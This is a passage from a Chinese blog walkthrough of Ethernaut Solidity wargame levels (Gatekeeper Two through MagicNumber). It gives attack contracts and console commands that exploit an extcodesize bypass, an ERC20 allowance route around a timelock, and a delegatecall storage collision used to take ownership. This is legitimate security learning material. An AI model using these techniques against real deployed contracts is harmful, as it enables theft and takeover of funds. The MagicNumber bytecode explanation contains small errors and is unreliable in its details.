One】即可。</p><p>但是第二个条件又要要求调用者的地址上不能没有代码，即貌似调用者必须是一个外部账户（EOA）？其实不然，如果一个合约，在构造函数运行阶段，对该地址调用<code>extcodesize</code>，则返回的是零，我们利用这一点即可。</p><p>对于第三个，先是对我们的调用方的地址进行打包，又进行计算哈希，又是转数组，又是转64位无符号整数的，最后还要和一个数字异或，看似很复杂，其实，我们可用使用异或的逆操作，即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x ^ y &#x3D; z</span><br><span class="line">则 x &#x3D; y ^ z</span><br></pre></td></tr></table></figure><p>最终，攻击的合约如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoAttack &#123;</span><br><span class="line">     constructor()  &#123;</span><br><span class="line">        &#x2F;&#x2F; 	该地址可以在控制台中输入 &#96;instance&#96; 获取</span><br><span class="line">        address _addr &#x3D; 0x0aD80881e0C2b8294beA62b5916Bb0029b93922e;</span><br><span class="line">        bytes8 _gateKey &#x3D; bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(this)))));</span><br><span class="line">    	_addr.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey)</span><br><span class="line">            );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#39;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&#39;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; string public constant name &#x3D; &#39;NaughtCoin&#39;;</span><br><span class="line">  &#x2F;&#x2F; string public constant symbol &#x3D; &#39;0x0&#39;;</span><br><span class="line">  &#x2F;&#x2F; uint public constant decimals &#x3D; 18;</span><br><span class="line">  uint public timeLock &#x3D; block.timestamp + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) &#123;</span><br><span class="line">    player &#x3D; _player;</span><br><span class="line">    INITIAL_SUPPLY &#x3D; 1000000 * (10**uint256(decimals()));</span><br><span class="line">    &#x2F;&#x2F; _totalSupply &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    &#x2F;&#x2F; _balances[player] &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender &#x3D;&#x3D; player) &#123;</span><br><span class="line">      require(block.timestamp &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件</strong>：将您的代币余额变成零。</p><p>乍一看上去，由于十年期限的限制，我们无法使用<code>transfer</code>进行转账，但是实际上该代币是<code>ERC20</code>代币的实现，该代币接口中有一个授权转账的函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address spender &#x3D; _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        uint256 currentAllowance &#x3D; allowance(owner, spender);</span><br><span class="line">        if (currentAllowance !&#x3D; type(uint256).max) &#123;</span><br><span class="line">            require(currentAllowance &gt;&#x3D; amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是使用该函数有个前提条件，即<code>msg.sender</code>要获得<code>from</code>的授权，授权代币额度大于等于<code>amount</code>。</p><p>因此我们要给自己授权，该函数实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner &#x3D; _msgSender();</span><br><span class="line">        _approve(owner, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>spender</code>是被授权方。</p><p>因此依次在控制台输入如下即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player,<span class="string">'1000000000000000000000000'</span>)</span><br><span class="line"><span class="keyword">await</span> contract.transferFrom(player,<span class="string">'0x34a2Bdc713002B5b7c80F20233b306977aD3B64E'</span>,<span class="string">'1000000000000000000000000'</span>)</span><br></pre></td></tr></table></figure><p><code>0x34a2Bdc713002B5b7c80F20233b306977aD3B64E</code>是一个合法的第三方账户。</p><h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  &#x2F;&#x2F; Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature &#x3D; bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">    timeZone1Library &#x3D; _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library &#x3D; _timeZone2LibraryAddress; </span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime &#x3D; _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件</strong>：获得合约所有权。</p><p>我们先来回顾一下<code>delegatecall</code>的用法</p><p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130226.png" alt></p><p>实际上，你可以粗略地理解成我们把目标合约的函数代码给拿了过来，放在我们当前合约中执行，修改的是当前合约的变量，相当于引入库函数的功能。</p><p>我们先来看一下<code>Preservation</code>合约的存储：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) | timeZone1Library (20)| &lt;- slot 0</span><br><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) | timeZone2Library (20)| &lt;- slot 1</span><br><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) |       owner (20)     | &lt;- slot 2</span><br><span class="line">---------------------------------------</span><br><span class="line">|            storedTime (32)          | &lt;- slot 3</span><br><span class="line">---------------------------------------</span><br><span class="line">|    unused (28) |setTimeSignature (4)| &lt;- slot 4</span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure><p>再来看看<code>LibraryContract</code>合约的存储：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------</span><br><span class="line">|            storedTime (32)          | &lt;- slot 0</span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure><p>由于变量<code>storedTime</code>在<code>LibraryContract</code>合约中，是在<code>slot 0</code>的位置，因此当<code>Preservation</code>调用<code>setFirstTime</code>的时候，由于<code>delegatecall</code>的特性，修改的是其<code>slot 0</code>处的变量，即变量<code>timeZone1Library</code>，也就是说，我们可将其设置为一个恶意地址，指向一个恶意合约，然后恶意中修改<code>owner</code>变量即可。</p><p>攻击合约如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract PreservationAttack &#123;</span><br><span class="line"></span><br><span class="line">  address public foo1;</span><br><span class="line">  address public foo2;</span><br><span class="line">  address public storedTime; </span><br><span class="line"></span><br><span class="line"> function setTime(uint _time) public &#123;</span><br><span class="line"> &#x2F;&#x2F; storedTime 是在 slot 2 的位置，因此将来修改的是 owner</span><br><span class="line">    storedTime &#x3D; address(uint160(_time));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先部署上述合约，获得其地址<code>0x5F100674E2b7b3Ff0C3E93582151fA16E75e96eD</code>，然后在控制台输入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="string">'0x5F100674E2b7b3Ff0C3E93582151fA16E75e96eD'</span>)</span><br></pre></td></tr></table></figure><p>再调用函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(player)</span><br></pre></td></tr></table></figure><p>即可完成修改。</p><h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">    name &#x3D; _name;</span><br><span class="line">    balances[_creator] &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; msg.value * 10;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;&#x3D; _amount);</span><br><span class="line">    balances[msg.sender] &#x3D; balances[msg.sender] - _amount;</span><br><span class="line">    balances[_to] &#x3D; _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件</strong>：找回已部署的<code>SimpleToken</code>合约。</p><p> 该关卡考察的应该是如何根据合约地址去追踪历史交易。</p><p>我们先在控制台输入<code>instance</code>，获取关卡实例地址，注意，这不是合约<code>SimpleToken</code>的地址，得到该实力地址以后，打开浏览器，输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sepolia.etherscan.io&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p>我用的是sepolia测试网，如果使用的是其他测试网，要相应地修改地址</p></blockquote><p>输入实力地址，并选择internal transaction，找到最新的记录</p><p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230304132643.png" alt></p><p>点击【Contract Creation】，进去后得到一个地址<code>0x502C2D61E236119acEe7E973cb7fB1cd180AcB8f</code>，而且该地址账户拥有0.001ether，实际上该地址就是我们要找的合约地址，我们只要调用该地址上面的<code>destroy</code>函数即可，我们可用通关部署一下合约进行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract RecoveryAttack &#123;</span><br><span class="line">&#x2F;&#x2F; 在控制台输入  player 获得对应地址</span><br><span class="line">  constructor(address _player)&#123;</span><br><span class="line">  </span><br><span class="line">  	address(0x502C2D61E236119acEe7E973cb7fB1cd180AcB8f).call(</span><br><span class="line">  		abi.encodeWithSignature(&quot;destroy(address)&quot;, _player)</span><br><span class="line">  	);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver &#x3D; _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    ____________&#x2F;\\\_______&#x2F;\\\\\\\\\_____        </span><br><span class="line">     __________&#x2F;\\\\\_____&#x2F;\\\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\___       </span><br><span class="line">      ________&#x2F;\\\&#x2F;\\\____\&#x2F;&#x2F;&#x2F;______\&#x2F;&#x2F;\\\__      </span><br><span class="line">       ______&#x2F;\\\&#x2F;\&#x2F;\\\______________&#x2F;\\\&#x2F;___     </span><br><span class="line">        ____&#x2F;\\\&#x2F;__\&#x2F;\\\___________&#x2F;\\\&#x2F;&#x2F;_____    </span><br><span class="line">         __&#x2F;\\\\\\\\\\\\\\\\_____&#x2F;\\\&#x2F;&#x2F;________   </span><br><span class="line">          _\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\&#x2F;&#x2F;____&#x2F;\\\&#x2F;___________  </span><br><span class="line">           ___________\&#x2F;\\\_____&#x2F;\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\&#x2F;&#x2F;&#x2F;_____\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;__</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件</strong>：部署一个合约</p><p>我们需要部署一个合约<code>Solver</code>，该合约中会返回一个数字，和<code>whatIsTheMeaningOfLife()</code>对应，实际上是42（<del>别问我怎么知道，问就是网友说的</del>）.还要要求该合约中的字节码不超过10个。</p><p>本关卡好难，直接去网上看别人的做法！</p><blockquote><p>参考链接<a href="https://paper.seebug.org/790/" target="_blank" rel="noopener">【以太坊智能合约静态分析】</a>、<a href="https://www.ethervm.io/" target="_blank" rel="noopener">【ethervm.io】</a>【<a href="https://xz.aliyun.com/t/11159#toc-9】" target="_blank" rel="noopener">https://xz.aliyun.com/t/11159#toc-9】</a></p></blockquote><p>智能合约编译后的字节码，分为三个部分：部署代码、runtime代码、auxdata。</p><p>当然，auxdata是源码的加密指纹，用来验证。这只是数据，永远不会被EVM执行。</p><p>以太坊虚拟机在创建合约的时候，会先创建一个合约账户，然后运行部署代码。运行完成后它会将<strong>runtime代码+auxdata 存储到区块链上</strong>。之后再把二者的存储地址跟合约账户关联起来(也就是把合约账户中的code hash字段用该地址赋值)，这样就完成了合约的部署。而我们本关卡主要是从runtime代码入手。</p><p>如果我们要返回42，则最后的字节码必须是<code>RETURN</code>，使用该字节码时候，将会依次从栈中取两个元素，作为偏移量<code>offset</code>和长度<code>length</code>，最终返回的内容是<code>memory[offset:offset+length]</code>，因此我们要在<code>RETURN</code>上面将偏移量和长度写进栈中，然后在此之上，再写入42到内存<code>memory</code>中。具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">偏移    汇编指令对应二进制（16进制）实际汇编指令</span><br><span class="line">0000    602a                 PUSH1 0x2a</span><br><span class="line">0002    6050                 PUSH1 0x50</span><br><span class="line">0004    52                   mstore</span><br><span class="line">0007    6020                 PUSH1 0x20</span><br><span class="line">0009    6050                 PUSH1 0x50</span><br><span class="line">000B    F3                   RETURN</span><br></pre></td></tr></table></figure><p>前三行是写入42，后三行是设置<code>return</code>的内容.设置偏移量为<code>0x50</code>是因为我们的低部分位置放了代码。</p><p>上述的汇编作为<code>runtime</code>代码，刚好10个字节，即10个<code>opcode</code>（以太坊中，一个字节码占用一个字节）。</p><p>下一步，我们要通过部署代码，将<code>runtime</code>代码写入区块链；在部署代码这一块，写入代码需要使用<code>CODECOPY</code>，该操作码会依次从栈中取出三个操作数<code>destOffset</code>、<code>offset</code>、<code>length</code>，即完成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory[destOffset:destOffset+length] &#x3D; msg.data[offset:offset+length]</span><br></pre></td></tr></table></figure><p>因此这一段的汇编如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">偏移    汇编指令对应二进制（16进制）实际汇编指令</span><br><span class="line">0000    600a            PUSH1 0x0a</span><br><span class="line">0002    600c            PUSH1 0x0c</span><br><span class="line">0004    6000            PUSH1 0x00</span><br><span class="line">0006    39              CODECOPY</span><br><span class="line">0007    600a            PUSH1 0x0a</span><br><span class="line">0009    6000            PUSH1 0x00</span><br><span class="line">000B    F3              RETURN</span><br></pre></td></tr></table></figure><p>第一次<code>push</code>的是<code>0x0a</code>，这是runtime代码的长度，第二次<code>push</code>的是<code>0x0c</code>，是因为我们的部署代码的长度是12个字节，我们将<code>runtime</code>代码附在部署代码后面，则<code>runtime</code>代码的偏移量是<code>0x0c</code>，第三次<code>push</code>的是<code>0x00</code>，是因为我们打算将我们的<code>runtime</code>代码保存到内存<code>memory</code>的<code>slot 0</code>处。最后是将<code>memory</code>的空间扩展到<code>len=0x0a</code>(如果之前不足的话) 并返回部署后的字节码.最终的汇编如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">偏移    汇编指令对应二进制（16进制）实际汇编指令</span><br><span class="line">0000    600a            	PUSH1 0x0a</span><br><span class="line">0002    600c            	PUSH1 0x0c</span><br><span class="line">0004    6000            	PUSH1 0x00</span><br><span class="line">0006    39              	CODECOPY</span><br><span class="line">0007    600a            	PUSH1 0x0a</span><br><span class="line">0009    6000            	PUSH1 0x00</span><br><span class="line">000B    F3              	RETURN</span><br><span class="line">000C    602a                 PUSH1 0x2a</span><br><span class="line">000E    6050                 PUSH1 0x50</span><br><span class="line">0010    52                   mstore</span><br><span class="line">0011    6020                 PUSH1 0x20</span><br><span class="line">0013    6050                 PUSH1 0x50</span><br><span class="line">0015    F3                   RETURN</span><br></pre></td></tr></table></figure><p>即<code>600a600c600039600a6000F3602a60505260206050F3</code>是我们要部署的内容。</p><p>我们在控制台输入一下代码即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">byteCode = <span class="string">"600a600c600039600a6000F3602a60505260206050F3"</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.sendTransaction(&#123;<span class="attr">from</span>: player, <span class="attr">data</span>: byteCode&#125;)</span><br><span class="line"><span class="comment">// 将会返回contract地址，假设为0x01</span></span><br><span class="line"><span class="keyword">await</span> contract.setSolver(<span class="string">'0x01'</span>)</span><br></pre></td></tr></table></figure><p>然后提交即可。</p><h2 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;helpers&#x2F;Ownable-05.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact &#x3D; true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">    codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    